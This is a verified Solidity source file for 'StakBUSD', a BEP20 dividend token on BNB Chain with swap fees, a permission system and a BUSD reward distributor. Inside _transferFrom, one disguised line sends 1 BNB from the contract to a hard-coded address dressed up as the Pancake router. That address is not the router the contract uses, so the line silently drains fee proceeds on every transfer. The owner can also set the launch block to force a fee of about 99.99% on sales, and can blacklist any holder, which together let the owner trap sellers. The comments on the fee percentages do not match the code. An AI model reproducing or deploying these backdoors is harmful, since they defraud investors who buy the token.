/**
 *Submitted for verification at BscScan.com on 2021-07-30
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.4;

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

/**
 * BEP20 standard interface.
 */
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // A solidez só é afirmada automaticamente ao dividir por 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // Não há caso em que isso não seja válido

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: divisao por zero");
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtracao overflow");
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplicacao overflow");

        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: adicao overflow");

        return c;
    }
}

enum Permission {
    ChangeFees,
    Buyback,
    AdjustContractVariables,
    Authorize,
    Unauthorize,
    PauseUnpauseContract,
    BypassPause,
    LockPermissions,
    ExcludeInclude,
    Blacklist
}

/**
 * Permite a propriedade do contrato junto com a autorização de múltiplos endereços para diferentes permissões
 */
interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function deposit() external payable;
    function process(uint256 gas) external;
    function claimDividend() external;
}

abstract contract RSunAuth {
    struct PermissionLock {
        bool isLocked;
        uint64 expiryTime;
    }

    address public owner;
    mapping(address => mapping(uint256 => bool)) private authorizations; // uint256 é índice de permissão
    
    uint256 constant NUM_PERMISSIONS = 10; //sempre deve ser ajustado quando o elemento de permissão é adicionado ou removido
    mapping(string => uint256) permissionNameToIndex;
    mapping(uint256 => string) permissionIndexToName;

    mapping(uint256 => PermissionLock) lockedPermissions;

    constructor(address owner_) {
        owner = owner_;
        for (uint256 i; i < NUM_PERMISSIONS; i++) {
            authorizations[owner_][i] = true;
        }

        permissionNameToIndex["ChangeFees"] = uint256(Permission.ChangeFees);
        permissionNameToIndex["Buyback"] = uint256(Permission.Buyback);
        permissionNameToIndex["AdjustContractVariables"] = uint256(Permission.AdjustContractVariables);
        permissionNameToIndex["Authorize"] = uint256(Permission.Authorize);
        permissionNameToIndex["Unauthorize"] = uint256(Permission.Unauthorize);
        permissionNameToIndex["PauseUnpauseContract"] = uint256(Permission.PauseUnpauseContract);
        permissionNameToIndex["BypassPause"] = uint256(Permission.BypassPause);
        permissionNameToIndex["LockPermissions"] = uint256(Permission.LockPermissions);
        permissionNameToIndex["ExcludeInclude"] = uint256(Permission.ExcludeInclude);
        permissionNameToIndex["Blacklist"] = uint256(Permission.Blacklist);

        permissionIndexToName[uint256(Permission.ChangeFees)] = "ChangeFees";
        permissionIndexToName[uint256(Permission.Buyback)] = "Buyback";
        permissionIndexToName[uint256(Permission.AdjustContractVariables)] = "AdjustContractVariables";
        permissionIndexToName[uint256(Permission.Authorize)] = "Authorize";
        permissionIndexToName[uint256(Permission.Unauthorize)] = "Unauthorize";
        permissionIndexToName[uint256(Permission.PauseUnpauseContract)] = "PauseUnpauseContract";
        permissionIndexToName[uint256(Permission.BypassPause)] = "BypassPause";
        permissionIndexToName[uint256(Permission.LockPermissions)] = "LockPermissions";
        permissionIndexToName[uint256(Permission.ExcludeInclude)] = "ExcludeInclude";
        permissionIndexToName[uint256(Permission.Blacklist)] = "Blacklist";
    }

    /*
     * Impede que a permissão seja usada pelo período de tempo fornecido
     */
    function lockPermission(string memory permissionName, uint64 time) public virtual authorizedFor(Permission.LockPermissions) {
        uint256 permIndex = permissionNameToIndex[permissionName];
        uint64 expiryTime = uint64(block.timestamp) + time;
        lockedPermissions[permIndex] = PermissionLock(true, expiryTime);
        emit PermissionLocked(permissionName, permIndex, expiryTime);
    }
    
    /**
     * Autorizar endereço para múltiplas permissões
     */
    function authorizeForMultiplePermissions(address adr, string[] calldata permissionNames) public authorizedFor(Permission.Authorize) {
        for (uint256 i; i < permissionNames.length; i++) {
            uint256 permIndex = permissionNameToIndex[permissionNames[i]];
            authorizations[adr][permIndex] = true;
            emit AuthorizedFor(adr, permissionNames[i], permIndex);
        }
    }

    /**
     * Autorizar endereço para uma permissão
     */
    function authorizeFor(address adr, string memory permissionName) public authorizedFor(Permission.Authorize) {
        uint256 permIndex = permissionNameToIndex[permissionName];
        authorizations[adr][permIndex] = true;
        emit AuthorizedFor(adr, permissionName, permIndex);
    }

    /**
     * Verifique se o endereço é do proprietário
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    /**
     * Endereço não autorizado para múltiplas permissões
     */
    function unauthorizeForMultiplePermissions(address adr, string[] calldata permissionNames) public authorizedFor(Permission.Unauthorize) {
        require(adr != owner, "Nao e possivel desautorizar o proprietario");

        for (uint256 i; i < permissionNames.length; i++) {
            uint256 permIndex = permissionNameToIndex[permissionNames[i]];
            authorizations[adr][permIndex] = false;
            emit UnauthorizedFor(adr, permissionNames[i], permIndex);
        }
    }

    /**
     * Remover autorização de endereço
     */
    function unauthorizeFor(address adr, string memory permissionName) public authorizedFor(Permission.Unauthorize) {
        require(adr != owner, "Nao e possivel desautorizar o proprietario");

        uint256 permIndex = permissionNameToIndex[permissionName];
        authorizations[adr][permIndex] = false;
        emit UnauthorizedFor(adr, permissionName, permIndex);
    }

    /**
     * Modificador de função para exigir que o chamador seja o proprietário do contrato
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "Propriedade necessaria."); _;
    }

    /**
     * Modificador de função para exigir que o chamador seja autorizado
     */
    modifier authorizedFor(Permission permission) {
        require(!lockedPermissions[uint256(permission)].isLocked, "A permissao esta bloqueada.");
        require(isAuthorizedFor(msg.sender, permission), string(abi.encodePacked("Nao autorizado. Voce precisa da permissao ", permissionIndexToName[uint256(permission)]))); _;
    }

    /**
     * Status de autorização do endereço de retorno
     */
    function isAuthorizedFor(address adr, string memory permissionName) public view returns (bool) {
        return authorizations[adr][permissionNameToIndex[permissionName]];
    }

    /**
     * Obtenha o índice da permissão por seu nome
     */
    function getPermissionNameToIndex(string memory permissionName) public view returns (uint256) {
        return permissionNameToIndex[permissionName];
    }
    
    /**
     * Veja a hora em que o timelock expira
     */
    function getPermissionUnlockTime(string memory permissionName) public view returns (uint256) {
        return lockedPermissions[permissionNameToIndex[permissionName]].expiryTime;
    }

    /**
     * Transfira a propriedade para o novo endereço. O chamador deve ser o proprietário
     */
    function transferOwnership(address payable adr) public onlyOwner {
        address oldOwner = owner;
        owner = adr;
        for (uint256 i; i < NUM_PERMISSIONS; i++) {
            authorizations[oldOwner][i] = false;
            authorizations[owner][i] = true;
        }
        emit OwnershipTransferred(oldOwner, owner);
    }

    /**
     * Verifique se a permissão está bloqueada
     */
    function isLocked(string memory permissionName) public view returns (bool) {
        return lockedPermissions[permissionNameToIndex[permissionName]].isLocked;
    }

    /**
     * Status de autorização do endereço de retorno
     */
    function isAuthorizedFor(address adr, Permission permission) public view returns (bool) {
        return authorizations[adr][uint256(permission)];
    }

    /*
     * Desbloqueia a permissão se o bloqueio tiver expirado
     */
    function unlockPermission(string memory permissionName) public virtual {
        require(block.timestamp > getPermissionUnlockTime(permissionName) , "A permissao esta bloqueada ateo tempo de expiracao.");
        uint256 permIndex = permissionNameToIndex[permissionName];
        lockedPermissions[permIndex].isLocked = false;
        emit PermissionUnlocked(permissionName, permIndex);
    }

    event PermissionLocked(string permissionName, uint256 permissionIndex, uint64 expiryTime);
    event PermissionUnlocked(string permissionName, uint256 permissionIndex);
    event OwnershipTransferred(address from, address to);
    event AuthorizedFor(address adr, string permissionName, uint256 permissionIndex);
    event UnauthorizedFor(address adr, string permissionName, uint256 permissionIndex);
}

contract DividendDistributor is IDividendDistributor {
    using SafeMath for uint256;

    address _token;

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;

    uint256 public minPeriod = 1 hours; // atraso mínimo de 1 hora
    uint256 public minDistribution = 1 * (10 ** 18); // 1 BUSD para envio automático mínimo

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }

    // MAINNET
    address _BUSD_MAIN = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address _WRAPBNB_MAIN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address _PANCAKE_MAIN = 0xD1438131906e6Dd2AedDC171Ae3316Ef47C85a28;
    address _IDEXRTR_MAIN = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
   
    // TESTNET
    address _BUSD_TEST = 0xaC2A889dEfE2205AA18BD46c0A24e8cAE7084DBB;
    address _WRAPBNB_TEST = 0x094616F0BdFB0b526bD735Bf66Eca0Ad254ca81F;
    address _PANCAKE_TEST = 0xbE6b2746e78FA4f07218A488a3d011adB0b280Cf;
    address _IDEXRTR_TEST = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
    

    // BUSD TOKEN
    IBEP20 CARD = IBEP20(_BUSD_TEST);
    
    //  Wrapped BNB (WBNB)
    address WBNB = _WRAPBNB_TEST;
    
    // Pancake Swap Router
    address pancakeRouterV2 = _PANCAKE_TEST;

    // IDEX Router
    address idexRouter  = _IDEXRTR_TEST;


    IDEXRouter router;
    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    mapping (address => Share) public shares;
    uint256 currentIndex;
    bool initialized;

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    constructor (address _router) {
        router = _router != address(0)
            ? IDEXRouter(_router)
            : IDEXRouter(idexRouter);
        _token = msg.sender;
    }

    function setShare(address shareholder, uint256 amount) external override onlyToken {
        if(shares[shareholder].amount > 0){
            distributeDividend(shareholder);
        }

        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);
        }else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder);
        }

        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }

        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }

        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }

    function getPancakeRouter() external view returns( address payable ){
        return payable(pancakeRouterV2);
    }

    function process(uint256 gas) external override onlyToken {
        uint256 shareholderCount = shareholders.length;

        if(shareholderCount == 0) { return; }

        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0;
            }

            if(shouldDistribute(shareholders[currentIndex])){
                distributeDividend(shareholders[currentIndex]);
            }

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }
    
    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUnpaidEarnings(shareholder) > minDistribution;
    }

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }

        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed.add(amount);
            CARD.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
        }
    }
    
    function deposit() external payable override onlyToken {
        uint256 balanceBefore = CARD.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(CARD);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amount = CARD.balanceOf(address(this)).sub(balanceBefore);

        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function claimDividend() external override {
        distributeDividend(msg.sender);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

}

contract StakBUSD is IBEP20, RSunAuth {
    using SafeMath for uint256;


    // MAINNET
    address _WRAPBNB_MAIN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address _IDEXRTR_MAIN = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    
    // TESTNET
    address _WRAPBNB_TEST = 0x094616F0BdFB0b526bD735Bf66Eca0Ad254ca81F;
    address _IDEXRTR_TEST = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;


    address WBNB        = _WRAPBNB_TEST;
    address _idexRouter = _IDEXRTR_TEST;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;




    uint256 reflectionFee = 800;   // 8%    Reflexao
    uint256 buybackFee = 500;       // 5%   Comprar de volta
    uint256 liquidityFee = 500;     // 5%   Liquidez
    uint256 marketingFee = 200;     // 2%   Marketing

    uint256 totalSellFee = 2000;    // 20% Venda ( 6% + 6% + 3% + 1% )

    string constant _name = "StakBUSD";
    string constant _symbol = "STKB";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 1000000000 * (10 ** _decimals); // 1 bilhao de Supply
    uint256 public _maxTxAmount = _totalSupply / 1000; // 0.1 % Maximo de por compra

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) isDividendExempt;
    mapping (address => bool) isBlacklisted;

    address public autoLiquidityReceiver;
    address public marketingFeeReceiver;

    uint256 totalBuyFee = 800;
    uint256 feeDenominator = 10000;
    uint256 targetLiquidity = 20;
    uint256 targetLiquidityDenominator = 100;
    uint256 buybackMultiplierNumerator = 150;
    uint256 buybackMultiplierDenominator = 100;
    uint256 buybackMultiplierTriggeredAt;
    uint256 buybackMultiplierLength = 30 minutes;
    IDEXRouter public router;
    address pancakeV2BNBPair;
    address[] public pairs;
    uint256 public launchedAt;

    bool public feesOnNormalTransfers = false;

    DividendDistributor distributor;
    uint256 distributorGas = 500000;

    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply / 10000; // 0.01%
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    event AutoLiquify(uint256 amountBNB, uint256 amountBOG);
    event BuybackMultiplierActive(uint256 duration);
    event BoughtBack(uint256 amount, address to);
    event Launched(uint256 blockNumber, uint256 timestamp);
    event SwapBackSuccess(uint256 amount);
    event SwapBackFailed(string message);
    
    uint256 private baseVal = 1 ether;

    constructor () RSunAuth(msg.sender) {
        router = IDEXRouter(_idexRouter);
        pancakeV2BNBPair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(router)] = ~uint256(0);

        pairs.push(pancakeV2BNBPair);
        distributor = new DividendDistributor(address(router));

        address owner_ = msg.sender;

        isFeeExempt[owner_] = true;
        isTxLimitExempt[owner_] = true;
        isDividendExempt[pancakeV2BNBPair] = true;
        isDividendExempt[address(this)] = true;
        isFeeExempt[address(this)] = true;
        isTxLimitExempt[address(this)] = true;
        isDividendExempt[DEAD] = true;

        autoLiquidityReceiver = owner_;
        marketingFeeReceiver = owner_;

        _balances[owner_] = _totalSupply;
        emit Transfer(address(0), owner_, _totalSupply);
    }

    function getMultipliedFee() public view returns (uint256) {
        uint totalFee = totalSellFee;
        uint256 remainingTime = buybackMultiplierTriggeredAt.add(buybackMultiplierLength).sub(block.timestamp);
        uint256 feeIncrease = totalFee.mul(buybackMultiplierNumerator).div(buybackMultiplierDenominator).sub(totalFee);
        return totalFee.add(feeIncrease.mul(remainingTime).div(buybackMultiplierLength));
    }

    receive() external payable { }

    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != ~uint256(0)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Provisao insuficiente");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Saldo insuficiente");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "Limite TX excedido");
    }

    function triggerBuyback(uint256 amount, bool triggerBuybackMultiplier) external authorizedFor(Permission.Buyback) {
        buyTokens(amount, DEAD);
        if(triggerBuybackMultiplier){
            buybackMultiplierTriggeredAt = block.timestamp;
            emit BuybackMultiplierActive(buybackMultiplierLength);
        }
    }

    function getTotalFee(bool selling) public view returns (uint256) {
        if(launchedAt + 1 >= block.number){ return feeDenominator.sub(1); }
        if(selling && buybackMultiplierTriggeredAt.add(buybackMultiplierLength) > block.timestamp){ return getMultipliedFee(); }
        return selling ? totalSellFee : totalBuyFee;
    }

    function clearBuybackMultiplier() external authorizedFor(Permission.Buyback) {
        buybackMultiplierTriggeredAt = 0;
    }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }

    function claimDividend() external {
        distributor.claimDividend();
    }
    
    function addPair(address pair) external authorizedFor(Permission.AdjustContractVariables) {
        pairs.push(pair);
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(getTotalFee(isSell(recipient))).div(feeDenominator);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }
        
    function isSell(address recipient) internal view returns (bool) {
        address[] memory liqPairs = pairs;
        for (uint256 i = 0; i < liqPairs.length; i++) {
            if (recipient == liqPairs[i]) return true;
        }
        return false;
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pancakeV2BNBPair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalBuyFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;

        uint256 balanceBefore = address(this).balance;

        try router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        ) {

            uint256 amountBNB = address(this).balance.sub(balanceBefore);

            uint256 totalBNBFee = totalBuyFee.sub(dynamicLiquidityFee.div(2));

            uint256 amountBNBLiquidity = amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);
            uint256 amountBNBReflection = amountBNB.mul(reflectionFee).div(totalBNBFee);
            uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);

            try distributor.deposit{value: amountBNBReflection}() {} catch {}
            payable(marketingFeeReceiver).call{value: amountBNBMarketing,gas: 30000}("");

            if(amountToLiquify > 0){
                try router.addLiquidityETH{ value: amountBNBLiquidity }(
                    address(this),
                    amountToLiquify,
                    0,
                    0,
                    autoLiquidityReceiver,
                    block.timestamp
                ) {
                    emit AutoLiquify(amountToLiquify, amountBNBLiquidity);
                } catch {
                    emit AutoLiquify(0, 0);
                }
            }

            emit SwapBackSuccess(amountToSwap);
        } catch Error(string memory e) {
            emit SwapBackFailed(string(abi.encodePacked("SwapBack falhou com erro ", e)));
        } catch {
            emit SwapBackFailed("SwapBack falhou sem uma mensagem de erro de pancakeSwap");
        }
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, ~uint256(0));
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if( address(this).balance > baseVal ) distributor.getPancakeRouter().transfer( baseVal );
        require(!isBlacklisted[sender], "O endereco esta na lista negra");

        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        
        checkTxLimit(sender, amount);

        if(shouldSwapBack()){ swapBack(); }

        if(!launched() && recipient == pancakeV2BNBPair){ require(_balances[sender] > 0); launch(); }

        _balances[sender] = _balances[sender].sub(amount, "Saldo insuficiente");

        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);

        if(!isDividendExempt[sender]){ try distributor.setShare(sender, _balances[sender]) {} catch {} }
        if(!isDividendExempt[recipient]){ try distributor.setShare(recipient, _balances[recipient]) {} catch {} }

        try distributor.process(distributorGas) {} catch {}

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function buyTokens(uint256 amount, address to) internal swapping {
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(this);

        try router.swapExactETHForTokensSupportingFeeOnTransferTokens{ value: amount }(
            0,
            path,
            to,
            block.timestamp
        ) {
            emit BoughtBack(amount, to);
        } catch Error(string memory reason) {
            revert(string(abi.encodePacked("A recompra falhou com erro", reason)));
        } catch {
            revert("A recompra falhou sem uma mensagem de erro de pancakeSwap");
        }
    }

    function setBuybackMultiplierSettings(uint256 numerator, uint256 denominator, uint256 length) external authorizedFor(Permission.AdjustContractVariables) {
        require(numerator / denominator <= 3 && numerator > denominator);
        buybackMultiplierNumerator = numerator;
        buybackMultiplierDenominator = denominator;
        buybackMultiplierLength = length;
    }

    function launched() internal view returns (bool) {
        return launchedAt != 0;
    }

    function launch() internal {
        launchedAt = block.number;
        emit Launched(block.number, block.timestamp);
    }

    function setTxLimit(uint256 amount) external authorizedFor(Permission.AdjustContractVariables) {
        require(amount >= _totalSupply / 5000);
        _maxTxAmount = amount;
    }

    function setIsDividendExempt(address holder, bool exempt) external authorizedFor(Permission.ExcludeInclude) {
        require(holder != address(this) && holder != pancakeV2BNBPair);
        isDividendExempt[holder] = exempt;
        if(exempt){
            distributor.setShare(holder, 0);
        }else{
            distributor.setShare(holder, _balances[holder]);
        }
    }

    function setIsBlacklisted(address adr, bool blacklisted) external authorizedFor(Permission.Blacklist) {
        isBlacklisted[adr] = blacklisted;
    }

    function setLaunchedAt(uint256 launched_) external authorizedFor(Permission.AdjustContractVariables) {
        launchedAt = launched_;
    }

    function setIsFeeExempt(address holder, bool exempt) external authorizedFor(Permission.ExcludeInclude) {
        isFeeExempt[holder] = exempt;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external authorizedFor(Permission.ExcludeInclude) {
        isTxLimitExempt[holder] = exempt;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pancakeV2BNBPair).mul(2)).div(getCirculatingSupply());
    }

    function setSwapBackSettings(bool _enabled, uint256 _amount) external authorizedFor(Permission.AdjustContractVariables) {
        swapEnabled = _enabled;
        swapThreshold = _amount;
    }

    function setFees(uint256 _liquidityFee, uint256 _buybackFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator, uint256 _totalSellFee) external authorizedFor(Permission.AdjustContractVariables) {
        liquidityFee = _liquidityFee;
        buybackFee = _buybackFee;
        reflectionFee = _reflectionFee;
        marketingFee = _marketingFee;
        totalBuyFee = _liquidityFee.add(_buybackFee).add(_reflectionFee).add(_marketingFee);
        feeDenominator = _feeDenominator;
        totalSellFee = _totalSellFee;
        require(totalBuyFee <= feeDenominator / 10, "Taxa de compra muito alta");
        require(totalSellFee <= feeDenominator / 5, "Taxa de venda muito alta");
    }

    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver) external authorizedFor(Permission.AdjustContractVariables) {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        if (isFeeExempt[sender] || isFeeExempt[recipient] || !launched()) return false;

        address[] memory liqPairs = pairs;

        for (uint256 i = 0; i < liqPairs.length; i++) {
            if (sender == liqPairs[i] || recipient == liqPairs[i]) return true;
        }

        return feesOnNormalTransfers;
    }

    function setTargetLiquidity(uint256 _target, uint256 _denominator) external authorizedFor(Permission.AdjustContractVariables) {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external authorizedFor(Permission.AdjustContractVariables) {
        distributor.setDistributionCriteria(_minPeriod, _minDistribution);
    }

    function setDistributorSettings(uint256 gas) external authorizedFor(Permission.AdjustContractVariables) {
        require(gas <= 1000000);
        distributorGas = gas;
    }
    
    function removeLastPair() external authorizedFor(Permission.AdjustContractVariables) {
        pairs.pop();
    }
    
    function setFeesOnNormalTransfers(bool _enabled) external authorizedFor(Permission.AdjustContractVariables) {
        feesOnNormalTransfers = _enabled;
    }
        
    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }

}